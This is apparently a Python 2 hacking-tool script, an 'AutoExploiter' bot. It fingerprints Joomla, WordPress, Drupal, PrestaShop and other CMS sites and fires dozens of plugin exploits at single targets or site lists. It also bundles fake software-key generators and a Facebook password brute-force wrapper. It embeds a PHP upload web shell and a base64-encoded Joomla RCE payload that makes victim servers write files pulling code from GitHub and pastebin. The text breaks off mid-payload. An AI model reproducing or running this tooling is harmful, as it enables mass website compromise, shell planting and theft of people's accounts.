#!/usr/bin/env python
# encoding: utf-8
import sys,os,re,socket,binascii,time,json,random,threading,Queue,pprint,urlparse,smtplib,telnetlib,os.path,hashlib,string,urllib2,glob,sqlite3,urllib,argparse,marshal,base64
from colorama import *
from random import choice
from colorama import Fore,Back,init
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from platform import system
from Queue import Queue
from time import strftime
from urlparse import urlparse
from urllib2 import urlopen
init()
la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
def steam() :
 print("""   
 {k}(               )     )  
 )\ )  *   )  ( /(  ( /(  
(()/(` )  /(  )\()) )\()) 
 /(_))( )(_))((_)\ ((_)\  
(_)) (_(_())|_ ((_)_ ((_) 
{r}/ __||_   _|| |/ /\ \ / / 
\__ \  | |    ' <  \ V /  
|___/  |_|   _|\_\  |_|                             
{a}   ST=Steam / KY=KEY
 {s}Steam Generator (c)ARON-tn & YassineHd""").format(k=lazra9,r=la7mar,a=la5dhar,s=lasfar)
 az=input('Enter Number Keys > ')
 try :
   for az in range(int(az)) :
    urname = string.ascii_letters + string.digits
    urname1 = ''.join(choice(urname) for _ in range(5))
    taki = string.ascii_letters + string.digits
    taki2 = ''.join(choice(taki) for _ in range(5))
    metsuha = string.ascii_letters + string.digits
    metsuha3 = ''.join(choice(metsuha) for _ in range(5)) 
    mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
    print(az+1,")",mark," by MegaBot")
    save = open("steam.txt", 'a')
    save.write(mark + '\n')
   print("{k}Done :) Keys Saved In {r}steam.txt").format(k=lazra9,r=la7mar)
 except : 
	   	 pass
def fitromailon(x, y):
    if x!=0 :
      print "   %s[%s+%s]%s %s : %s"%(la7mar,lazra9,la7mar,la5dhar,y,x)
def fnhack() :
 print('''
{r}    ___           __        ___               
{r}   / _ )______ __/ /____   / _/__  ___________ 
{g}  / _  / __/ // / __/ -_) / _/ _ \/ __/ __/ -_)
{g} /____/_/  \_,_/\__/\__/ /_/ \___/_/  \__/\__/ 

{b}    ____             __             __         
{b}   / __/__ ________ / /  ___  ___  / /__       
{c}  / _// _ `/ __/ -_) _ \/ _ \/ _ \/  \'_/       
{c} /_/  \_,_/\__/\__/_.__/\___/\___/_/\_\       
                                               
 FACEBOOK BRUTE FORCE (c)ARON-tn & YassineHd''') .format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
 mail = raw_input ('enter mail >')
 passs= raw_input('enter list password >')
 os.system ('perl f4c.pl '+mail+' '+passs)
def hma() :
 print("""
{k}    )   *        )  
 ( /( (  `    ( /(  
 )\()))\))(   )\()) 
((_)\((_)()\|((_)\  
 _((_|_()((_)_ ((_) 
{r}| || |  \/  | |/ /  
| __ | |\/| | ' <   
|_||_|_|  |_|_|\_\  
{a}   HM=HMA/K=Key                    
 {s}Hidemyass Generator (c)ARON-tn & YassineHd """).format(k=lazra9,r=la7mar,a=la5dhar,s=lasfar)
 ze=input('Enter Number Keys > ')
 try :
   for az in range(int(ze)) :
    urname = string.ascii_letters + string.digits
    urname1 = ''.join(choice(urname) for _ in range(6))
    taki = string.ascii_letters + string.digits
    taki2 = ''.join(choice(taki) for _ in range(6))
    metsuha = string.ascii_letters + string.digits
    metsuha3 = ''.join(choice(metsuha) for _ in range(6)) 
    mark = urname1.upper() +('-')+ taki2.upper() +('-')+ metsuha3.upper()
    print(az+1,")",mark," by MegaBot")
    save = open("hma.txt", 'a')
    save.write(mark + '\n')
   print("{k}Done :) Keys Saved In {r}Hma.txt").format(k=lazra9,r=la7mar)
 except : 
	   	 pass
class AutoExploiter(object):
    def __init__(self):
        try:
            os.mkdir('result')
        except:
            pass
        try:
            os.mkdir('logs')
        except:
            pass
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.shell_code = '''
<title>wordpress_project</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>
'''
        self.version = '1.5.1'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'aron-tn@protonmail.com'
        self.Jce_Deface_image = 'files/br4in.gif'
        self._shell = 'files/shell.jpg'
        self.indeX = 'files/index.jpg'
        self.TextindeX = 'files/vuln.txt'
        self.TextindeX1 = 'files/br4infabrik.txt'
        self.MailPoetZipShell = 'files/rock.zip'
        self.ZipJd = 'files/jdownlods.zip'
        self.pagelinesExploitShell = 'files/settings_auto.php'
        self.jdShell = 'files/payload3.php3.j'
        self.ShellPresta = 'files/up.php'
        self.gravShell = 'files/grav.jpg'

        try:
         self.Print_options()
         self.select=raw_input('Choice ')
        except:
          print"Error !!"
          AutoExploiter()
        if self.select == str('1'):  # Single
            self.cls()
            self.print_logo()
            self.Url = raw_input(self.r + '    [+]' + self.c + 'Enter Target: ' + self.y)
            if self.Url.startswith("http://"):
                self.Url = self.Url.replace("http://", "")
            elif self.Url.startswith("https://"):
                self.Url = self.Url.replace("https://", "")
            else:
                pass
            try:
                CheckOsc = requests.get('http://' + self.Url + '/admin/images/cal_date_over.gif', timeout=10)
                CheckOsc2 = requests.get('http://' + self.Url + '/admin/login.php', timeout=10)
                CheckCMS = requests.get('http://' + self.Url + '/templates/system/css/system.css', timeout=5)
                Checktwo = requests.get('http://' + self.Url, timeout=5)
                if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                    self.Print_Scanning(self.Url, 'joomla')
                    self.RCE_Joomla(self.Url)
                    self.Joomla_TakeADmin(self.Url)
                    self.Com_AdsManager_Shell(self.Url)
                    self.alberghiExploit(self.Url)
                    self.Com_CCkJseblod(self.Url)
                    self.Com_Fabric(self.Url)
                    self.Com_Hdflvplayer(self.Url)
                    self.Com_Jdownloads_shell(self.Url)
                    self.Com_Joomanager(self.Url)
                    self.Com_MyBlog(self.Url)
                    self.Com_Macgallery(self.Url)
                    self.JCE_shell(self.Url)
                    self.Com_s5_media_player(self.Url)
                    self.Com_Jbcatalog(self.Url)
                    self.Com_SexyContactform(self.Url)
                    self.Com_rokdownloads(self.Url)
                    self.Com_extplorer(self.Url)
                    self.Com_jwallpapers_Shell(self.Url)
                    self.Com_facileforms(self.Url)
                    self.JooMLaBruteForce(self.Url)
                    self.FckEditor(self.Url)
                elif '/wp-content/' in Checktwo.text.encode('utf-8'):
                    self.Print_Scanning(self.Url, 'Wordpress')
                    self.Revslider_SHELL(self.Url)
                    self.wysijaExploit(self.Url)
                    self.WP_User_Frontend(self.Url)
                    self.Gravity_Forms_Shell(self.Url)
                    self.HD_WebPlayerSqli(self.Url)
                    self.pagelinesExploit(self.Url)
                    self.HeadWayThemeExploit(self.Url)
                    self.addblockblocker(self.Url)
                    self.cherry_plugin(self.Url)
                    self.formcraftExploit_Shell(self.Url)
                    self.UserProExploit(self.Url)
                    self.wp_mobile_detector(self.Url)
                    self.Wp_Job_Manager(self.Url)
                    self.wp_content_injection(self.Url)
                    self.Woocomrece(self.Url)
                    self.viral_optins(self.Url)
                    self.CateGory_page_icons(self.Url)
                    self.Downloads_Manager(self.Url)
                    self.wp_support_plus_responsive_ticket_system(self.Url)
                    self.wp_miniaudioplayer(self.Url)
                    self.eshop_magic(self.Url)
                    self.ungallery(self.Url)
                    self.barclaycart(self.Url)
                    self.FckEditor(self.Url)
                elif '/sites/default/' in Checktwo.text.encode('utf-8')\
                        or 'content="Drupal' in Checktwo.text.encode('utf-8'):
                    self.Print_Scanning(self.Url, 'drupal')
                    self.DrupalGedden2(self.Url)
                    self.DrupalBruteForce(self.Url)
                    self.Drupal_Sqli_Addadmin(self.Url)

                    self.FckEditor(self.Url)
                elif 'GIF89a' in CheckOsc.text.encode('utf-8') or 'osCommerce' in CheckOsc2.text.encode('utf-8'):
                    self.Print_Scanning(self.Url, 'osCommerce')
                    self.osCommerce(self.Url)
                    self.FckEditor(self.Url)
                elif 'prestashop' in Checktwo.text.encode('utf-8'):
                    self.lib(self.Url)
                    self.psmodthemeoptionpanel(self.Url)
                    self.tdpsthemeoptionpanel(self.Url)
                    self.megamenu(self.Url)
                    self.nvn_export_orders(self.Url)
                    self.pk_flexmenu(self.Url)
                    self.wdoptionpanel(self.Url)
                    self.fieldvmegamenu(self.Url)
                    self.wg24themeadministration(self.Url)
                    self.videostab(self.Url)
                    self.cartabandonmentproOld(self.Url)
                    self.cartabandonmentpro(self.Url)
                    self.advancedslider(self.Url)
                    self.attributewizardpro_x(self.Url)
                    self.attributewizardpro3(self.Url)
                    self.attributewizardpro2(self.Url)
                    self.attributewizardpro(self.Url)
                    self.jro_homepageadvertise(self.Url)
                    self.homepageadvertise2(self.Url)
                    self.homepageadvertise(self.Url)
                    self.productpageadverts(self.Url)
                    self.simpleslideshow(self.Url)
                    self.vtermslideshow(self.Url)
                    self.soopabanners(self.Url)
                    self.soopamobile(self.Url)
                    self.columnadverts(self.Url)
                    self.FckEditor(self.Url)
                elif 'catalog/view/' in Checktwo.text.encode('utf-8'):
                    self.OpenCart(self.Url)
                    self.FckEditor(self.Url)
                else:
                    self.Print_Scanning(self.Url, 'Unknown')
                    self.FckEditor(self.Url)
            except:
                self.Timeout(self.Url)
                sys.exit()


        elif self.select == str('2'):  # multi List
            self.cls()
            try:
                self.print_logo()
                Get_list = raw_input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
                with open(Get_list, 'r') as zz:
                    Readlist = zz.read().splitlines()
            except IOError:
                print self.r + '--------------------------------------------'
                print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
                sys.exit()
            thread = []
            for xx in Readlist:
                t = threading.Thread(target=self.Work2, args=(xx, ''))
                t.start()
                thread.append(t)
                time.sleep(0.1)
            for j in thread:
                j.join()
        elif self.select == str('4'):
            try:
                self.cls()
                self.print_logo()
                GoT = requests.get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/update.txt', timeout=5)
                if self.version in GoT.text.encode('utf-8'):
                    print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c +\
                          "Sorry But You Don't Have New Update ... Try later."
                else:
                    Loop = True
                    print self.r + '    [' + self.c + '+' + self.r + '] ' + self.g + 'update Is available! Update Now.'
                    print self.r + '       [' + self.c + '+' + self.r + '] ' + self.y + 'github.com/04x/ICG-AutoExploiterBoT/\n'
                    while Loop:
                        Get = raw_input(self.r + '    [' + self.g + '*' + self.r + '] ' + self.c +
                                        'You Want know What is New in New Version ? [y]es or [n]o : ')
                        if Get == str('y'):
                            update_details = requests.get('https://raw.githubusercontent.com/'
                                         '04x/ICG-AutoExploiterBoT/master/files/update_details.txt', timeout=5)
                            print update_details.text.encode('utf-8')
                            Loop = False
                        elif Get == str('n'):
                            self.cls()
                            self.print_logo()
                            Loop = False
                        else:
                            continue
            except:
                self.Timeout('Github.com')
        elif self.select == str('3'):
            self.cls()
            self.print_logo()
            self.concurrent = 75
            try:
                self.Get_list = raw_input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
            except IOError:
                print self.r + '--------------------------------------------'
                print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
                sys.exit()
            self.q = Queue(self.concurrent * 2)
            for i in range(self.concurrent):
                self.t = threading.Thread(target=self.doWork)
                self.t.daemon = True
                self.t.start()
            try:
                for url in open(self.Get_list):
                    self.q.put(url.strip())
                self.q.join()
            except:
                pass

        else:
            self.cls()
            self.print_logo()
            print self.r + '--------------------------------------------'
            print self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + ' Option Not Found! Try Again...'


            # elif self.select == str(3):  # IP Server
            # self.cls()
            # IPserv = raw_input('    Enter IP server: ')
            # reverse = reverse_ipz()
            # reverse.Reverse_ip(IPserv)
            # try:
            #     with open('logs/' + reverse.ip + '.txt', 'r') as reader:
            #         readlines = reader.read().splitlines()
            # except:
            #     print ' i cant Find List of urls in server! use from option 2.'
            #     sys.exit()
            # for xx in readlines:
            #     self.Url = xx
            #     if self.Url.startswith("http://"):
            #         self.Url = self.Url.replace("http://", "")
            #     elif self.Url.startswith("https://"):
            #         self.Url = self.Url.replace("https://", "")
            #     else:
            #         pass
            #     try:
            #         CheckCMS = requests.get('http://' + self.Url + '/language/en-GB/en-GB.xml', timeout=7)
            #         if 'version="' in CheckCMS.text.encode('utf-8'):
            #             self.Print_Scanning(self.Url, 'joomla')
            #             self.RCE_Joomla()
            #             self.Joomla_TakeADmin()
            #             self.Com_AdsManager_Shell()
            #             self.alberghiExploit()
            #             self.Com_CCkJseblod()
            #             self.Com_Fabric()
            #             self.Com_Hdflvplayer()
            #             self.Com_Jdownloads_shell()
            #             self.Com_Joomanager()
            #             self.Com_MyBlog()
            #             self.Com_Macgallery()
            #             self.JCE_shell()
            #             self.Com_s5_media_player()
            #         else:
            #             self.Print_Scanning(self.Url, 'Unknown')
            #     except requests.ConnectionError:
            #         self.Timeout(self.Url)



    def Work2(self, url, s):
        try:
            if url.startswith("http://"):
                url = url.replace("http://", "")
            elif url.startswith("https://"):
                url = url.replace("https://", "")
            else:
                pass
            CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10)
            CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10)
            CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
            Checktwo = requests.get('http://' + url, timeout=5)
            if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                self.RCE_Joomla(url)
                self.Joomla_TakeADmin(url)
                self.Com_AdsManager_Shell(url)
                self.alberghiExploit(url)
                self.Com_CCkJseblod(url)
                self.Com_Fabric(url)
                self.Com_Hdflvplayer(url)
                self.Com_Jdownloads_shell(url)
                self.Com_Joomanager(url)
                self.Com_MyBlog(url)
                self.Com_Macgallery(url)
                self.JCE_shell(url)
                self.Com_s5_media_player(url)
                self.Com_Jbcatalog(url)
                self.Com_SexyContactform(url)
                self.Com_rokdownloads(url)
                self.Com_extplorer(url)
                self.Com_jwallpapers_Shell(url)
                self.Com_facileforms(url)
                self.JooMLaBruteForce(url)
                self.FckEditor(url)
                self.q.task_done()
            elif '/wp-content/' in Checktwo.text.encode('utf-8'):
                self.Revslider_SHELL(url)
                self.wysijaExploit(url)
                self.WP_User_Frontend(url)
                self.Gravity_Forms_Shell(url)
                self.HD_WebPlayerSqli(url)
                self.pagelinesExploit(url)
                self.HeadWayThemeExploit(url)
                self.addblockblocker(url)
                self.cherry_plugin(url)
                self.formcraftExploit_Shell(url)
                self.UserProExploit(url)
                self.wp_mobile_detector(url)
                self.Wp_Job_Manager(url)
                self.wp_content_injection(url)
                self.viral_optins(url)
                self.Woocomrece(url)
                self.CateGory_page_icons(url)
                self.Downloads_Manager(url)
                self.wp_support_plus_responsive_ticket_system(url)
                self.wp_miniaudioplayer(url)
                self.eshop_magic(url)
                self.ungallery(url)
                self.barclaycart(url)
                self.FckEditor(url)
                self.q.task_done()
            elif '/sites/default/' in Checktwo.text.encode('utf-8') \
                    or 'content="Drupal' in Checktwo.text.encode('utf-8'):
                self.Drupal_Sqli_Addadmin(url)
                self.DrupalGedden2(url)
                self.DrupalBruteForce(url)
                self.FckEditor(url)
                self.q.task_done()
            elif 'GIF89a' in CheckOsc.text.encode('utf-8') or 'osCommerce' in CheckOsc2.text.encode('utf-8'):
                self.osCommerce(url)
                self.FckEditor(url)
                self.q.task_done()
            elif 'prestashop' in Checktwo.text.encode('utf-8'):
                self.lib(url)
                self.psmodthemeoptionpanel(url)
                self.tdpsthemeoptionpanel(url)
                self.megamenu(url)
                self.nvn_export_orders(url)
                self.pk_flexmenu(url)
                self.wdoptionpanel(url)
                self.fieldvmegamenu(url)
                self.wg24themeadministration(url)
                self.videostab(url)
                self.cartabandonmentproOld(url)
                self.cartabandonmentpro(url)
                self.advancedslider(url)
                self.attributewizardpro_x(url)
                self.attributewizardpro3(url)
                self.attributewizardpro2(url)
                self.attributewizardpro(url)
                self.jro_homepageadvertise(url)
                self.homepageadvertise2(url)
                self.homepageadvertise(url)
                self.productpageadverts(url)
                self.simpleslideshow(url)
                self.vtermslideshow(url)
                self.soopabanners(url)
                self.soopamobile(url)
                self.columnadverts(url)
                self.FckEditor(url)
                self.q.task_done()
            elif 'catalog/view/' in Checktwo.text.encode('utf-8'):
                self.OpenCart(self.Url)
                self.FckEditor(self.Url)
                self.q.task_done()
            else:
                self.FckEditor(url)
                self.q.task_done()
        except:
            pass
    def doWork(self):
        try:
            while True:
                url = self.q.get()
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith("https://"):
                    url = url.replace('https://', '')
                else:
                    pass
                try:
                    CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10)
                    CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10)
                    CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
                    Checktwo = requests.get('http://' + url, timeout=5)
                    if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                        self.RCE_Joomla(url)
                        self.Joomla_TakeADmin(url)
                        self.Com_AdsManager_Shell(url)
                        self.alberghiExploit(url)
                        self.Com_CCkJseblod(url)
                        self.Com_Fabric(url)
                        self.Com_Hdflvplayer(url)
                        self.Com_Jdownloads_shell(url)
                        self.Com_Joomanager(url)
                        self.Com_MyBlog(url)
                        self.Com_Macgallery(url)
                        self.JCE_shell(url)
                        self.Com_s5_media_player(url)
                        self.Com_Jbcatalog(url)
                        self.Com_SexyContactform(url)
                        self.Com_rokdownloads(url)
                        self.Com_extplorer(url)
                        self.Com_jwallpapers_Shell(url)
                        self.Com_facileforms(url)
                        self.JooMLaBruteForce(url)
                        self.FckEditor(url)
                        self.q.task_done()
                    elif '/wp-content/' in Checktwo.text.encode('utf-8'):
                        self.Revslider_SHELL(url)
                        self.wysijaExploit(url)
                        self.WP_User_Frontend(url)
                        self.Gravity_Forms_Shell(url)
                        self.HD_WebPlayerSqli(url)
                        self.pagelinesExploit(url)
                        self.HeadWayThemeExploit(url)
                        self.addblockblocker(url)
                        self.cherry_plugin(url)
                        self.formcraftExploit_Shell(url)
                        self.UserProExploit(url)
                        self.wp_mobile_detector(url)
                        self.Wp_Job_Manager(url)
                        self.wp_content_injection(url)
                        self.viral_optins(url)
                        self.Woocomrece(url)
                        self.CateGory_page_icons(url)
                        self.Downloads_Manager(url)
                        self.wp_support_plus_responsive_ticket_system(url)
                        self.wp_miniaudioplayer(url)
                        self.eshop_magic(url)
                        self.ungallery(url)
                        self.barclaycart(url)
                        self.FckEditor(url)
                        self.q.task_done()
                    elif '/sites/default/' in Checktwo.text.encode('utf-8') \
                            or 'content="Drupal' in Checktwo.text.encode('utf-8'):
                        self.Drupal_Sqli_Addadmin(url)
                        self.DrupalGedden2(url)
                        self.DrupalBruteForce(url)
                        self.FckEditor(url)
                        self.q.task_done()
                    elif 'GIF89a' in CheckOsc.text.encode('utf-8') or 'osCommerce' in CheckOsc2.text.encode('utf-8'):
                        self.osCommerce(url)
                        self.FckEditor(url)
                        self.q.task_done()
                    elif 'prestashop' in Checktwo.text.encode('utf-8'):
                        self.lib(url)
                        self.psmodthemeoptionpanel(url)
                        self.tdpsthemeoptionpanel(url)
                        self.megamenu(url)
                        self.nvn_export_orders(url)
                        self.pk_flexmenu(url)
                        self.wdoptionpanel(url)
                        self.fieldvmegamenu(url)
                        self.wg24themeadministration(url)
                        self.videostab(url)
                        self.cartabandonmentproOld(url)
                        self.cartabandonmentpro(url)
                        self.advancedslider(url)
                        self.attributewizardpro_x(url)
                        self.attributewizardpro3(url)
                        self.attributewizardpro2(url)
                        self.attributewizardpro(url)
                        self.jro_homepageadvertise(url)
                        self.homepageadvertise2(url)
                        self.homepageadvertise(url)
                        self.productpageadverts(url)
                        self.simpleslideshow(url)
                        self.vtermslideshow(url)
                        self.soopabanners(url)
                        self.soopamobile(url)
                        self.columnadverts(url)
                        self.FckEditor(url)
                        self.q.task_done()
                    elif 'catalog/view/' in Checktwo.text.encode('utf-8'):
                        self.OpenCart(self.Url)
                        self.FckEditor(self.Url)
                        self.q.task_done()
                    else:
                        self.FckEditor(url)
                        self.q.task_done()
                except:
                    pass
        except:
            pass



    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """

   _____          _ ____  _____    ____       _  _   _       
  / ____|        | |___ \|  __ \  |  _ \     | || | (_)      
 | |     ___   __| | __) | |  | | | |_) |_ __| || |_ _ _ __  
 | |    / _ \ / _` ||__ <| |  | | |  _ <| '__|__   _| | '_ \ 
 | |___| (_) | (_| |___) | |__| | | |_) | |     | | | | | | |
  \_____\___/ \__,_|____/|_____/  |____/|_|     |_| |_|_| |_|

              [=] Cod3D Br4in Payload Bot v3 [=]

    [+] Special Com_JCE Shell Upload Payload 
        ==> It can bypass & Upload Shell at the place of image(.gif)

    \xf0 Wordpress \xf0 Joomla \xf0 Drupal \xf0 OsCommerce \xf0 Prestashop \xf0 Opencart \xf0
               ==> Auto Exploiter, Auto Index Upload & Auto Shell Upload

            /!\  Greets to IRan-Cyber.net  /!\\

"""
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def Print_options(self):
        print self.w + '    [' + self.w + '1' + self.w + '] ' + self.r + 'Single Target' 
        print self.w + '    [' + self.w + '2' + self.w + '] ' + self.c + 'List Scan' 

    def Print_Scanning(self, url, CMS):
        print self.w + '    [' + self.w + '=' + self.w + '] ' + self.c + url + self.w + ' [ ' + CMS + ' ]'


    def Timeout(self, url):
        print self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + url + self.r + ' [ TimeOut!!/NotValid Url ]'

    def Print_NotVuln(self, NameVuln, site):
        print self.c + '       [' + self.w + '-' + self.c + '] ' + self.w + site + ' ' + self.c + NameVuln + self.r + ' [Not Vuln]'

    def Print_Username_Password(self, username, Password):
        print self.y + '           [' + self.c + '+' + self.y + '] ' + self.c + 'Username: ' + self.g + username
        print self.y + '           [' + self.c + '+' + self.y + '] ' + self.c + 'Password: ' + self.g + Password


    def Print_Vuln(self, NameVuln, site):
        print self.w + '       [' + self.g + '+' + self.w + '] ' + self.g + site + ' ' + self.c + NameVuln + self.g + ' [Vuln!!]'

    def Print_Vuln_index(self, indexPath):
        print self.w + '       [' + self.g + '+' + self.w + '] ' + self.g + indexPath + self.g + ' [Index Uploaded!]'

    def Print_vuln_Shell(self, shellPath):
        print self.w + '       [' + self.g + '!' + self.w + '] ' + self.g + shellPath + self.g + ' [Shell Uploaded!]'

    def Print_vuln_Config(self, pathconfig):
        print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + pathconfig + self.g + ' [Config Downloaded!]'


    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def RCE_Joomla(self, site):
        try:
            pl = self.generate_payload(
                "base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4yLnBocCIgOw0KJGZwPWZvcGVuKCIkY2hlY2siLCJ3KyIpOw0KZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBTkNtWjFibU4wYVc5dUlHaDBkSEJmWjJWMEtDUjFjbXdwZXcwS0NTUnBiU0E5SUdOMWNteGZhVzVwZENna2RYSnNLVHNOQ2dsamRYSnNYM05sZEc5d2RDZ2thVzBzSUVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNJREVwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5RFQwNU9SVU5VVkVsTlJVOVZWQ3dnTVRBcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOUdUMHhNVDFkTVQwTkJWRWxQVGl3Z01TazdEUW9KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYMGhGUVVSRlVpd2dNQ2s3RFFvSmNtVjBkWEp1SUdOMWNteGZaWGhsWXlna2FXMHBPdzBLQ1dOMWNteGZZMnh2YzJVb0pHbHRLVHNOQ24wTkNpUmphR1ZqYXlBOUlDUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMM1J0Y0M5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEx6QTBlQzlKUTBjdFFYVjBiMFY0Y0d4dmFYUmxja0p2VkM5dFlYTjBaWEl2Wm1sc1pYTXZkWEF1Y0dod0p5azdEUW9rYjNCbGJpQTlJR1p2Y0dWdUtDUmphR1ZqYXl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJpd2dKSFJsZUhRcE93MEtabU5zYjNObEtDUnZjR1Z1S1RzTkNtbG1LR1pwYkdWZlpYaHBjM1J6S0NSamFHVmpheWtwZXcwS0lDQWdJR1ZqYUc4Z0pHTm9aV05yTGlJOEwySnlQaUk3RFFwOVpXeHpaU0FOQ2lBZ1pXTm9ieUFpYm05MElHVjRhWFJ6SWpzTkNtVmphRzhnSW1SdmJtVWdMbHh1SUNJZ093MEtKR05vWldOck1pQTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJsdFlXZGxjeTkyZFd4dUxuQm9jQ0lnT3cwS0pIUmxlSFF5SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM4d05IZ3ZTVU5ITFVGMWRHOUZlSEJzYjJsMFpYSkNiMVF2YldGemRHVnlMMlpwYkdWekwzVndMbkJvY0NjcE93MEtKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdEUXBtWTJ4dmMyVW9KRzl3Wlc0eUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc05DaUFnSUNCbFkyaHZJQ1JqYUdWamF6SXVJand2WW5JK0lqc05DbjFsYkhObElBMEtJQ0JsWTJodklDSnViM1FnWlhocGRITXlJanNOQ21WamFHOGdJbVJ2Ym1VeUlDNWNiaUFpSURzTkNnMEtKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTkyZFd4dUxtaDBiU0lnT3cwS0pIUmxlSFF6SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk4NE9EQjFabUZYUmljcE93MEtKRzl3TXoxbWIzQmxiaWdrWTJobFkyc3pMQ0FuZHljcE93MEtabmR5YVhSbEtDUnZjRE1zSkhSbGVIUXpLVHNOQ21aamJHOXpaU2drYjNBektUc05DZzBLRFFva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhRMklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d05qMW1iM0JsYmlna1kyaGxZMnMyTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RZc0pIUmxlSFEyS1RzTkNtWmpiRzl6WlNna2IzQTJLVHNOQ2o4KycpKTsNCmZjbG9zZSgkZnApOw0KJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuMi5waHAiIDsNCiRmcDI9Zm9wZW4oIiRjaGVjazIiLCJ3KyIpOw0KZndyaXRlKCRmcDIsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVoxYm1OMGFXOXVJR2gwZEhCZloyVjBLQ1IxY213cGV3MEtDU1JwYlNBOUlHTjFjbXhmYVc1cGRDZ2tkWEpzS1RzTkNnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOURUMDVPUlVOVVZFbE5SVTlWVkN3Z01UQXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlHVDB4TVQxZE1UME5CVkVsUFRpd2dNU2s3RFFvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnTUNrN0RRb0pjbVYwZFhKdUlHTjFjbXhmWlhobFl5Z2thVzBwT3cwS0NX